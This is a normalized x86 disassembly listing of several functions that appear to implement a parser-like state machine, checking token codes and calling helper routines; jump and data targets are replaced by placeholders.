sub_10070c10
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
push 0x96
push 0x67
push 0x68
mov ebx 0x1
push ebx
mov eax edi
call sub_1006c810
add esp 0x10
test eax eax
je r-xdata
push 0x96
push 0x66
push 0x64
push 0x65
push 0x63
push 0x61
push 0x60
push ebx
mov eax edi
call sub_1006c810
add esp 0x20
test eax eax
jne r-xdata
mov esi [ ebp + 0x8 ]
call sub_1006cd50
push 0x0
push esi
call sub_1006cea0
push 0x0
mov ecx esi
mov edi eax
call sub_1006cf60
mov eax [ edi + 0x1c ]
add esp 0xc
push edi
push eax
call sub_1003b570
add esp 0x4
push eax
push r--data
call sub_1001f980
mov ecx [ esi + 0xc ]
add esp 0xc
mov ebx r--data
mov edi esi
mov [ ecx ] 0xe
call sub_1006d320
pop edi
pop esi
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
push 0x96
push 0x64
push 0x65
push 0x63
push 0x0
mov eax edi
call sub_1006c810
add esp 0x14
test eax eax
je r-xdata
push 0x96
push 0x64
push 0x65
push 0x63
push 0x5f
push 0x66
push eax
mov eax edi
call sub_1006c810
add esp 0x1c
test eax eax
jne r-xdata
mov esi 0x66
mov esi [ edi + 0x18 ]
jmp r-xdata
push 0x96
push 0x68
push 0x67
push eax
push 0x61
push 0x62
push 0x60
push 0xa
push eax
mov eax edi
call sub_1006c810
add esp 0x24
test eax eax
je r-xdata
mov esi ebx
call sub_1006cd50
mov eax ebx
call sub_1006cc00
mov edx [ ebx + 0xc ]
mov [ edx ] 0xc
cmp [ edi ] 0x2
jne r-xdata
push esi
call sub_1003b570
push eax
push r--data
call sub_1001f980
mov eax [ ebx + 0xc ]
xor esi esi
add esp 0xc
cmp [ eax + 0xc ] esi
jbe r-xdata
push 0x96
push 0x5f
push 0x0
push 0x0
lea eax [ ebp - 0x10 ]
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ebx
mov ebx [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x4 ]
push ebx
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x10 ] edx
call sub_1006d5b0
add esp 0x18
test eax eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
push edi
push ecx
call sub_10070230
add esp 0x8
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov esi [ ebp + 0x8 ]
push esi
mov eax edi
call sub_1006c750
mov edx [ esi + 0xc ]
mov eax [ edx + 0x68 ]
push eax
push esi
call sub_1001bee0
add esp 0xc
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebx + 0xc ]
mov [ eax + 0x34 ] 0x1
xor eax eax
cmp [ edi + 0x18 ] 0x66
sete al
test eax eax
jne r-xdata
push ebx
mov eax edi
call sub_1006c750
mov eax [ ebx + 0xc ]
mov ecx [ eax + 0x68 ]
push ecx
push ebx
call sub_1001bee0
add esp 0xc
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
jmp r-xdata
pop edi
pop esi
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ eax + 0x8 ]
mov eax [ ecx + esi * 4 ]
mov edx [ eax + 0x1c ]
push edx
call sub_1003b570
push eax
push r--data
call sub_1001f980
mov eax [ ebx + 0xc ]
inc esi
add esp 0xc
cmp esi [ eax + 0xc ]
jb r-xdata
sub_10070e30
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
push 0x96
push 0x68
push 0x67
push 0x0
mov eax edi
call sub_1006c810
add esp 0x10
mov ebx 0x1
push 0x96
test eax eax
je r-xdata
push 0x66
push 0x64
push 0x68
push 0x65
push 0x67
push 0x63
push 0x61
push 0x62
push 0x60
push ebx
mov eax edi
call sub_1006c810
add esp 0x2c
test eax eax
je r-xdata
mov esi [ edi + 0x18 ]
push 0x5f
push 0x0
push 0x0
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ebx
mov ebx [ ebp + 0x8 ]
push ecx
lea eax [ ebp - 0x4 ]
push ebx
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x10 ] eax
call sub_1006d5b0
add esp 0x18
test eax eax
jne r-xdata
push 0x96
push 0x0
push 0x61
push 0x62
push 0x60
push 0xa
push 0x0
mov eax edi
call sub_1006c810
add esp 0x1c
test eax eax
mov eax edi
je r-xdata
push r--data
call sub_1001f980
mov esi [ ebp + 0x8 ]
push 0x96
push 0x5f
push 0x0
push 0x0
lea eax [ ebp - 0x10 ]
push eax
lea edx [ ebp - 0x4 ]
push esi
mov [ ebp - 0x4 ] 0x68
mov [ ebp - 0x10 ] edx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ebx
call sub_1006d5b0
add esp 0x1c
test eax eax
jne r-xdata
push edi
mov eax esi
mov ecx ebx
call sub_1006da20
add esp 0x4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push ebx
mov eax edi
call sub_1006c750
add esp 0x4
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
push 0x96
push 0x66
push 0x64
push 0x65
push 0x63
push 0x5f
push 0x0
call sub_1006c810
add esp 0x1c
test eax eax
je r-xdata
mov esi [ ebp + 0x8 ]
push esi
call sub_1006c750
mov eax [ esi + 0xc ]
mov ecx [ eax + 0x68 ]
push ecx
push esi
call sub_1001bee0
add esp 0xc
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ esi + 0xc ]
mov [ edx + 0x34 ] ebx
call sub_1006dad0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0x96
push 0x5f
push eax
push eax
lea edx [ ebp - 0x10 ]
push edx
lea ecx [ ebp - 0x4 ]
push esi
mov [ ebp - 0x4 ] 0x67
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ebx
call sub_1006d5b0
add esp 0x18
test eax eax
jne r-xdata
mov edx [ ebp + 0x8 ]
push edi
push edx
call sub_1006ed80
add esp 0x8
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov esi [ ebp + 0x8 ]
mov eax [ edi + 0x18 ]
push esi
call sub_1006d8b0
add esp 0x4
test eax eax
jne r-xdata
push r--data
call sub_1001f980
push esi
mov eax edi
call sub_1006c750
mov eax [ esi + 0xc ]
mov ecx [ eax + 0x68 ]
push ecx
push esi
call sub_1001bee0
add esp 0x10
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ esi + 0xc ]
mov [ ecx + 0x34 ] ebx
call sub_1006dad0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push esi
mov eax edi
call sub_1006c750
mov edx [ esi + 0xc ]
mov eax [ edx + 0x68 ]
push eax
push esi
call sub_1001bee0
add esp 0xc
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
sub_10071040
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi [ esi ]
cmp edi 0x6
jne r-xdata
cmp edi 0x5
je r-xdata
mov edi [ ebp + 0x8 ]
push edi
mov eax esi
call sub_1006c750
mov eax [ edi + 0xc ]
mov ecx [ eax + 0x68 ]
push ecx
push edi
call sub_1001bee0
add esp 0xc
pop edi
xor eax eax
pop esi
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov edi esi
call sub_1006d1b0
pop edi
mov eax 0x1
pop esi
pop ebp
retn
cmp edi 0x4
je r-xdata
test edi edi
jne r-xdata
push ebx
cmp edi 0x3
jne r-xdata
mov edi [ ebp + 0x8 ]
push edi
mov eax esi
call sub_1006c750
mov edx [ edi + 0xc ]
mov eax [ edx + 0x68 ]
push eax
push edi
call sub_1001bee0
add esp 0xc
pop edi
xor eax eax
pop esi
pop ebp
retn
cmp edi 0x1
jne r-xdata
mov edi [ ebp + 0x8 ]
mov eax edi
call sub_1006c550
mov ebx eax
mov eax edi
call sub_1006cce0
pop ebx
pop edi
mov eax 0x1
pop esi
pop ebp
retn
cmp edi 0x2
jne r-xdata
mov eax [ esi + 0x18 ]
xor ecx ecx
test eax eax
sete cl
test ecx ecx
je r-xdata
cmp edi 0x1
jne r-xdata
mov eax [ esi + 0x18 ]
xor ecx ecx
cmp eax 0x71
sete cl
test ecx ecx
je r-xdata
xor ecx ecx
cmp eax 0x72
sete cl
test ecx ecx
je r-xdata
mov ecx [ ebp + 0x8 ]
push esi
push ecx
call sub_1006ed80
add esp 0x8
pop ebx
pop edi
pop esi
pop ebp
retn
push 0x96
push 0x73
push 0x74
push 0x6d
push 0x1
mov eax esi
call sub_1006c810
add esp 0x14
test eax eax
je r-xdata
xor eax eax
cmp [ esi + 0x18 ] 0x6f
sete al
test eax eax
je r-xdata
xor ecx ecx
cmp eax 0x72
sete cl
test ecx ecx
je r-xdata
mov edi [ ebp + 0x8 ]
mov ebx [ edi + 0xc ]
push 0x72
mov eax edi
call sub_1006c550
call sub_1006c8b0
add esp 0x4
test eax eax
je r-xdata
xor edx edx
cmp eax 0x71
sete dl
mov eax edx
test eax eax
je r-xdata
mov ebx [ ebp + 0x8 ]
push 0x72
jmp r-xdata
cmp edi 0x1
jne r-xdata
mov edi [ ebp + 0x8 ]
push edi
mov eax esi
call sub_1006c750
push edi
mov eax 0x6f
call sub_1006d8f0
add esp 0x8
test eax eax
jne r-xdata
mov edi [ ebp + 0x8 ]
push edi
mov eax esi
call sub_1006c750
mov ecx [ edi + 0xc ]
mov edx [ ecx + 0x68 ]
push edx
push edi
call sub_1001bee0
add esp 0xc
mov esi edi
call sub_1006db30
pop ebx
pop edi
xor eax eax
pop esi
pop ebp
retn
xor ecx ecx
cmp eax 0x6f
sete cl
mov eax ecx
test eax eax
je r-xdata
mov edi [ ebp + 0x8 ]
push 0x72
mov eax edi
call sub_1006c550
call sub_1006c8b0
add esp 0x4
test eax eax
jne r-xdata
push 0x71
mov eax edi
call sub_1006c550
call sub_1006c8b0
add esp 0x4
test eax eax
je r-xdata
mov eax [ ebx + 0xc ]
mov ecx [ ebx + 0x8 ]
mov eax [ ecx + eax * 4 - 0x8 ]
push 0x71
call sub_1006c8b0
add esp 0x4
test eax eax
je r-xdata
mov ebx [ ebp + 0x8 ]
push 0x72
mov eax ebx
call sub_1006c550
call sub_1006c8b0
add esp 0x4
test eax eax
je r-xdata
mov eax ebx
call sub_1006c550
call sub_1006c8b0
add esp 0x4
test eax eax
je r-xdata
cmp edi 0x7
mov edi [ ebp + 0x8 ]
jne r-xdata
xor eax eax
cmp [ esi + 0x18 ] 0x7
sete al
test eax eax
je r-xdata
mov esi edi
call sub_1006db30
mov edx [ edi + 0xc ]
pop ebx
pop edi
mov [ edx + 0x34 ] 0x1
xor eax eax
pop esi
pop ebp
retn
mov eax [ edi + 0xc ]
mov ecx [ eax + 0x68 ]
push ecx
push edi
call sub_1001bee0
add esp 0x8
pop ebx
pop edi
xor eax eax
pop esi
pop ebp
retn
mov edi [ ebp + 0x8 ]
push edi
mov eax 0x6f
call sub_1006d8f0
add esp 0x4
test eax eax
je r-xdata
mov eax edi
call sub_1006cc00
pop ebx
pop edi
mov eax 0x1
pop esi
pop ebp
retn
push edi
mov eax esi
call sub_1006c750
mov ecx [ edi + 0xc ]
mov edx [ ecx + 0x68 ]
push edx
push edi
call sub_1001bee0
add esp 0xc
pop ebx
pop edi
xor eax eax
pop esi
pop ebp
retn
push edi
mov eax esi
call sub_1006c750
mov edx [ edi + 0xc ]
mov eax [ edx + 0x68 ]
push eax
push edi
call sub_1001bee0
add esp 0xc
pop ebx
pop edi
xor eax eax
pop esi
pop ebp
retn
mov eax edi
call sub_1006cc00
push 0x71
mov eax ebx
call sub_1006cc00
mov edi esi
call sub_1006d010
pop ebx
pop edi
mov eax 0x1
pop esi
pop ebp
retn
mov eax ebx
call sub_1006cc00
mov eax edi
call sub_1006c550
mov ecx [ edi + 0x4 ]
cmp eax [ ecx + 0x4 ]
je r-xdata
mov eax [ ebp + 0x8 ]
push esi
push eax
call sub_1006ea50
add esp 0x8
pop ebx
pop edi
pop esi
pop ebp
retn
mov esi edi
call sub_1006db30
pop ebx
pop edi
mov eax 0x1
pop esi
pop ebp
retn
push edi
mov eax esi
call sub_1006c750
add esp 0x4
pop ebx
pop edi
xor eax eax
pop esi
pop ebp
retn
sub_10071380
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi [ ebp + 0xc ]
push edi
push 0x96
push 0x68
push 0x67
push 0x66
push 0x64
push 0x65
push 0x63
push 0x5f
push 0x60
mov ebx 0x1
push ebx
mov eax esi
call sub_1006c810
add esp 0x28
test eax eax
mov eax esi
je r-xdata
push 0x96
push 0x68
push 0x67
push 0x66
push 0x64
push 0x65
push 0x63
push 0x5f
push 0x60
push 0x0
call sub_1006c810
add esp 0x28
test eax eax
je r-xdata
mov edi [ ebp + 0x8 ]
push edi
call sub_1006c750
add esp 0x4
mov eax edi
call sub_1006cc00
lea esi [ ebx + 0x6e ]
lea ecx [ ecx ]
mov ecx [ ebp + 0x8 ]
push esi
push ecx
call sub_10071040
add esp 0x8
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edi [ ebp + 0x8 ]
push edi
mov eax esi
call sub_1006c750
mov ecx [ esi + 0x18 ]
push 0x96
push 0x5f
push 0x0
push 0x0
lea eax [ ebp - 0x10 ]
push eax
lea edx [ ebp - 0x4 ]
push edi
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ebx
call sub_1006d5b0
add esp 0x1c
test eax eax
je r-xdata
mov eax edi
call sub_1006cc00
jmp r-xdata
cmp [ eax + 0x1c ] esi
je r-xdata
mov edx [ edi + 0xc ]
mov eax [ edx + 0x68 ]
push eax
push edi
call sub_1001bee0
add esp 0x8
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
mov eax edi
call sub_1006cc00
mov esi 0x6f
cmp [ eax ] ebx
jne r-xdata
mov eax edi
call sub_1006c5e0
mov eax [ edi + 0xc ]
pop edi
mov [ eax + 0x34 ] ebx
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
mov eax edi
call sub_1006cc00
jmp r-xdata
cmp [ eax + 0x1c ] esi
je r-xdata
cmp [ eax ] ebx
jne r-xdata
mov eax edi
call sub_1006c5e0
mov eax edi
call sub_1006c5e0
mov ecx [ edi + 0xc ]
pop edi
pop esi
mov [ ecx + 0x34 ] ebx
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
sub_100714c0
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
mov ecx [ eax ]
cmp ecx 0x4
je r-xdata
mov ecx [ ebp + 0x8 ]
push eax
push ecx
call sub_1006ed80
add esp 0x8
pop ebp
retn
cmp ecx 0x1
jne r-xdata
push esi
cmp ecx 0x3
jne r-xdata
xor edx edx
cmp [ eax + 0x18 ] edx
sete dl
test edx edx
jne r-xdata
test ecx ecx
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x4 ]
push ebx
mov ebx [ edx + 0x4 ]
mov esi eax
mov eax ecx
call sub_1006cce0
pop ebx
mov eax 0x1
pop esi
pop ebp
retn
cmp ecx 0x2
jne r-xdata
mov esi [ ebp + 0x8 ]
push esi
call sub_1006c750
mov eax [ esi + 0xc ]
mov ecx [ eax + 0x68 ]
push ecx
push esi
call sub_1001bee0
add esp 0xc
xor eax eax
pop esi
pop ebp
retn
cmp ecx 0x7
je r-xdata
xor edx edx
cmp [ eax + 0x18 ] edx
sete dl
test edx edx
je r-xdata
mov eax 0x1
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push esi
call sub_1006c750
mov edx [ esi + 0xc ]
mov [ edx ] 0x6
mov eax [ esi + 0xc ]
add esp 0x4
mov [ eax + 0x34 ] 0x1
xor eax eax
pop esi
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov edx [ eax + 0xc ]
mov [ edx ] 0x15
mov eax [ eax + 0xc ]
mov ecx [ eax + 0x8 ]
mov ecx [ ecx ]
mov eax [ eax + 0x68 ]
add ecx 0x10
call sub_1006cbc0
sub_100715a0
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0xc ]
mov edx [ edi ]
cmp edx 0x4
jne r-xdata
push ebx
push esi
cmp edx 0x3
jne r-xdata
mov eax [ ebp + 0x8 ]
call sub_1006d1b0
mov eax 0x1
pop edi
pop ebp
retn
test edx edx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0xc ]
mov edx [ ecx + 0xc ]
test edx edx
jne r-xdata
cmp edx 0x1
jne r-xdata
mov esi [ ebp + 0x8 ]
mov ecx [ ecx + 0x8 ]
mov edx [ ecx + edx * 4 - 0x4 ]
mov esi edi
mov ebx edx
call sub_1006cce0
pop esi
pop ebx
mov eax 0x1
pop edi
pop ebp
retn
mov esi edi
mov ebx edx
call sub_1006cce0
pop esi
lea eax [ ebx + 0x1 ]
pop ebx
pop edi
pop ebp
retn
cmp edx 0x2
jne r-xdata
mov eax [ edi + 0x18 ]
xor ecx ecx
test eax eax
sete cl
test ecx ecx
je r-xdata
cmp edx 0x1
jne r-xdata
xor eax eax
cmp [ edi + 0x18 ] 0x81
sete al
test eax eax
je r-xdata
xor ecx ecx
cmp eax 0x81
sete cl
mov eax ecx
test eax eax
je r-xdata
mov ecx [ ebp + 0x8 ]
push edi
push ecx
call sub_1006ed80
add esp 0x8
pop esi
pop ebx
pop edi
pop ebp
retn
mov esi [ ebp + 0x8 ]
cmp edx 0x7
jne r-xdata
mov eax [ edi + 0x18 ]
xor ecx ecx
cmp eax 0x80
sete cl
test ecx ecx
je r-xdata
mov esi [ ebp + 0x8 ]
push 0x0
mov eax esi
call sub_1006c550
call sub_1006c8b0
add esp 0x4
test eax eax
jne r-xdata
mov ebx [ ebp + 0x8 ]
call sub_1006d010
pop esi
pop ebx
mov eax 0x1
pop edi
pop ebp
retn
push esi
mov eax edi
call sub_1006c750
mov eax [ esi + 0xc ]
mov ecx [ eax + 0x68 ]
push ecx
push esi
call sub_1001bee0
add esp 0xc
pop esi
pop ebx
xor eax eax
pop edi
pop ebp
retn
push 0x0
mov eax esi
call sub_1006c550
call sub_1006c8b0
add esp 0x4
test eax eax
jne r-xdata
xor ecx ecx
cmp eax 0x82
sete cl
mov eax ecx
test eax eax
je r-xdata
mov ebx [ ebp + 0x8 ]
call sub_1006d010
mov eax ebx
call sub_1006cc00
mov edx [ ebx + 0xc ]
mov [ edx + 0x38 ] 0x1
push esi
mov eax edi
call sub_1006c750
mov edx [ esi + 0xc ]
mov eax [ edx + 0x68 ]
push eax
push esi
call sub_1001bee0
add esp 0xc
pop esi
pop ebx
xor eax eax
pop edi
pop ebp
retn
mov eax esi
call sub_1006cc00
push 0x81
mov eax esi
call sub_1006c550
call sub_1006c8b0
add esp 0x4
test eax eax
jne r-xdata
pop esi
pop ebx
mov eax 0x1
pop edi
pop ebp
retn
push esi
mov eax edi
call sub_1006c750
add esp 0x4
pop esi
pop ebx
xor eax eax
pop edi
pop ebp
retn
mov edx [ ebp + 0x8 ]
push edi
push edx
call sub_1006ea50
add esp 0x8
pop esi
pop ebx
pop edi
pop ebp
retn
pop esi
pop ebx
mov eax 0x1
pop edi
pop ebp
retn
mov ecx [ esi + 0xc ]
mov [ ecx ] 0x14
sub_10071780
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
mov ecx [ eax ]
push edi
cmp ecx 0x4
jne r-xdata
push esi
cmp ecx 0x3
jne r-xdata
mov edi eax
mov eax [ ebp + 0x8 ]
call sub_1006d1b0
mov eax 0x1
pop edi
pop ebp
retn
test ecx ecx
je r-xdata
mov edi [ ebp + 0x8 ]
mov ecx [ edi + 0xc ]
mov edx [ ecx + 0xc ]
test edx edx
je r-xdata
mov esi [ ebp + 0x8 ]
push esi
call sub_1006c750
mov edx [ esi + 0xc ]
mov eax [ edx + 0x68 ]
push eax
push esi
call sub_1001bee0
add esp 0xc
pop esi
xor eax eax
pop edi
pop ebp
retn
cmp ecx 0x1
jne r-xdata
push ebx
mov esi eax
mov ebx edx
mov eax edi
call sub_1006cce0
pop ebx
pop esi
mov eax 0x1
pop edi
pop ebp
retn
mov ecx [ ecx + 0x8 ]
mov edx [ ecx + edx * 4 - 0x4 ]
cmp ecx 0x2
jne r-xdata
xor edx edx
cmp [ eax + 0x18 ] edx
sete dl
test edx edx
je r-xdata
cmp ecx 0x1
jne r-xdata
xor edx edx
cmp [ eax + 0x18 ] edx
sete dl
test edx edx
je r-xdata
mov ecx [ ebp + 0x8 ]
push eax
push ecx
call sub_1006ed80
add esp 0x8
pop esi
pop edi
pop ebp
retn
cmp ecx 0x7
je r-xdata
xor edx edx
cmp [ eax + 0x18 ] 0x82
sete dl
test edx edx
je r-xdata
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xc ]
mov edx [ eax + 0x8 ]
mov ecx [ edx ]
mov eax [ eax + 0x68 ]
add ecx 0x10
call sub_1006cbc0
mov eax [ esi + 0xc ]
mov [ eax ] 0x16
pop esi
mov eax 0x1
pop edi
pop ebp
retn
mov ecx [ ebp + 0x8 ]
push eax
push ecx
call sub_1006ea50
add esp 0x8
pop esi
pop edi
pop ebp
retn
sub_10071880
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
mov ecx [ esi ]
cmp ecx 0x3
jne r-xdata
test ecx ecx
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x4 ]
push ebx
mov ebx [ ecx ]
call sub_1006cce0
pop ebx
mov eax 0x1
pop esi
pop ebp
retn
mov ecx [ ebp + 0x8 ]
push esi
push ecx
call sub_1006ed80
add esp 0x8
pop esi
pop ebp
retn
cmp ecx 0x4
je r-xdata
cmp ecx 0x1
jne r-xdata
cmp ecx 0x7
jne r-xdata
xor eax eax
cmp [ esi + 0x18 ] eax
sete al
test eax eax
jne r-xdata
push edi
mov edi [ ebp + 0x8 ]
push edi
mov eax esi
call sub_1006c750
mov edx [ edi + 0xc ]
add esp 0x4
mov [ edx ] 0x6
mov eax [ edi + 0xc ]
pop edi
mov [ eax + 0x34 ] 0x1
xor eax eax
pop esi
pop ebp
retn
lea eax [ ecx - 0x6 ]
pop esi
pop ebp
retn
sub_10071910
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
mov ecx [ esi ]
cmp ecx 0x3
jne r-xdata
test ecx ecx
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x4 ]
push ebx
mov ebx [ ecx ]
call sub_1006cce0
pop ebx
mov eax 0x1
pop esi
pop ebp
retn
mov edx [ ebp + 0x8 ]
push esi
push edx
call sub_1006ed80
add esp 0x8
pop esi
pop ebp
retn
cmp ecx 0x4
je r-xdata
cmp ecx 0x1
jne r-xdata
cmp ecx 0x7
jne r-xdata
xor eax eax
cmp [ esi + 0x18 ] eax
sete al
test eax eax
jne r-xdata
cmp ecx 0x1
jne r-xdata
lea eax [ ecx - 0x6 ]
pop esi
pop ebp
retn
push edi
mov edi [ ebp + 0x8 ]
push edi
mov eax esi
call sub_1006c750
mov eax [ edi + 0xc ]
mov ecx [ eax + 0x68 ]
push ecx
push edi
call sub_1001bee0
add esp 0xc
pop edi
xor eax eax
pop esi
pop ebp
retn
xor eax eax
cmp [ esi + 0x18 ] 0x82
sete al
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push esi
push edx
call sub_1006ea50
add esp 0x8
pop esi
pop ebp
retn
sub_100719c0
push ebp
mov ebp esp
sub esp 0x14
push ebx
push esi
mov ebx eax
mov esi [ ebx ]
push edi
cmp esi 0x6
ja r-xdata
push 0x96
push 0x33
push 0x1e
push 0x3a
push 0x94
push 0x5f
push 0x37
push 0x36
push 0x8a
push 0x29
push 0x41
push 0x2a
push 0x2b
push 0x3c
push 0x1b
push 0x19
push 0x1d
push 0x92
push 0x5
push 0x7a
push 0x84
push 0x1f
push 0x47
push 0x38
push 0x1a
push 0x1
push 0x14
push 0x13
push 0x12
push 0x11
push 0x10
push 0xf
push 0x49
push 0x28
push 0x21
push 0x20
push 0x26
push 0x22
push 0x32
push 0x8e
push 0x42
push 0xa
push 0x1c
push 0x8c
push 0x39
push 0x1
call sub_1006c810
add esp 0xb8
test eax eax
jne r-xdata
jmp [ esi * 4 + jump_table_10071d80 ]
mov edi [ ebp + 0x8 ]
push edi
mov eax ebx
call sub_1006c750
add esp 0x4
cmp esi 0x1
jne r-xdata
mov esi [ ebp + 0x8 ]
push esi
call sub_1006c750
mov [ ebx ] 0x5
mov eax [ r--data ]
mov [ ebx + 0x18 ] eax
add esp 0x4
mov edi ebx
mov eax esi
call sub_1006d1b0
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov edi ebx
call sub_1006d1b0
pop edi
pop esi
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
mov esi [ ebp + 0x8 ]
mov edi ebx
mov eax esi
call sub_1006d1b0
push r--data
call sub_1001f980
mov ecx [ esi + 0xc ]
add esp 0x4
pop edi
pop esi
mov [ ecx + 0x3c ] 0x0
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0xc ]
mov edx [ ecx + 0xc ]
test edx edx
jne r-xdata
mov esi [ ebp + 0x8 ]
push esi
call sub_1006c750
mov edx [ esi + 0xc ]
mov eax [ edx + 0x68 ]
push eax
push esi
call sub_1001bee0
add esp 0xc
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ edi + 0xc ]
mov [ ecx + 0x34 ] 0x1
mov eax edi
call sub_1006c550
call sub_1006c900
test eax eax
jne r-xdata
mov edi [ ebp + 0x8 ]
mov eax [ edi + 0xc ]
mov ecx [ eax + 0xc ]
test ecx ecx
jne r-xdata
cmp [ ebx + 0x18 ] 0x8f
sete al
test eax eax
je r-xdata
mov ecx [ ecx + 0x8 ]
mov edx [ ecx + edx * 4 - 0x4 ]
mov esi ebx
mov ebx edx
call sub_1006cce0
pop edi
pop esi
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
mov esi ebx
mov ebx edx
call sub_1006cce0
pop edi
pop esi
lea eax [ ebx + 0x1 ]
pop ebx
mov esp ebp
pop ebp
retn
mov eax edi
call sub_1006c550
cmp [ eax + 0x20 ] 0x0
jne r-xdata
mov edx [ eax + 0x8 ]
mov esi [ edx + ecx * 4 - 0x4 ]
xor esi esi
jmp r-xdata
cmp [ ebx ] 0x1
jne r-xdata
lea esi [ ebx + 0x1c ]
push r--data
push esi
call sub_1002e6f0
add esp 0x8
test eax eax
jne r-xdata
mov eax edi
call sub_1006cc00
mov eax edi
call sub_1006c550
mov esi eax
call sub_1006c8d0
test eax eax
jne r-xdata
mov edx [ edi + 0xc ]
mov edi [ edx + 0xc ]
dec edi
test edi edi
jle r-xdata
push edi
mov eax ebx
call sub_1006c750
add esp 0x4
mov [ ebp - 0x4 ] 0x0
mov eax [ ebx + 0x10 ]
mov ecx [ ebx + 0x14 ]
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x14 ] eax
mov edx [ esi + 0x24 ]
mov [ ebp - 0xc ] edx
mov eax [ esi + 0x28 ]
lea ecx [ ebp - 0x14 ]
push ecx
mov [ ebp - 0x8 ] eax
call sub_10037d30
lea edx [ ebp - 0xc ]
push edx
call sub_10037d30
lea eax [ ebp - 0x14 ]
push eax
lea ecx [ ebp - 0xc ]
push ecx
mov [ ebp - 0x4 ] 0x1
call sub_100543c0
add esp 0x10
test eax eax
jne r-xdata
mov edi [ ebp + 0x8 ]
mov eax [ edi + 0xc ]
mov ecx [ eax + 0xc ]
test ecx ecx
je r-xdata
push r--data
push esi
call sub_1002e6f0
add esp 0x8
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0xc ]
mov edx [ ecx ]
push ebx
push eax
mov eax [ edx * 4 + r--data ]
call eax
add esp 0x8
test eax eax
je r-xdata
mov eax [ ebp - 0xc ]
mov ecx [ ebp - 0x8 ]
push edi
push eax
push ecx
push r--data
call sub_1001f980
lea edx [ ebp - 0x14 ]
push edx
lea eax [ ebp - 0xc ]
push eax
call sub_100543c0
add esp 0x18
test eax eax
jne r-xdata
mov esi [ ecx + 0x20 ]
cmp esi 0x2
jne r-xdata
mov edx [ eax + 0x8 ]
mov ecx [ edx + ecx * 4 - 0x4 ]
push r--data
push esi
call sub_1002e6f0
add esp 0x8
test eax eax
jne r-xdata
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push r--data
call sub_1001f980
add esp 0x4
mov edi edi
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0xc ]
mov eax [ edx + 0x8 ]
mov esi [ eax + edi * 4 - 0x4 ]
dec edi
cmp [ esi + 0x20 ] 0x0
je r-xdata
cmp esi 0x1
jne r-xdata
mov eax ebx
call sub_1006df30
jmp r-xdata
pop edi
pop esi
mov eax 0x1
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
call sub_1006cc00
cmp eax esi
jne r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ esi + 0x24 ]
mov [ ebp - 0xc ] ecx
mov edx [ esi + 0x28 ]
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0x8 ] edx
call sub_10037d30
add esp 0x4
test edi edi
jg r-xdata
push edi
mov eax ebx
call sub_1006de70
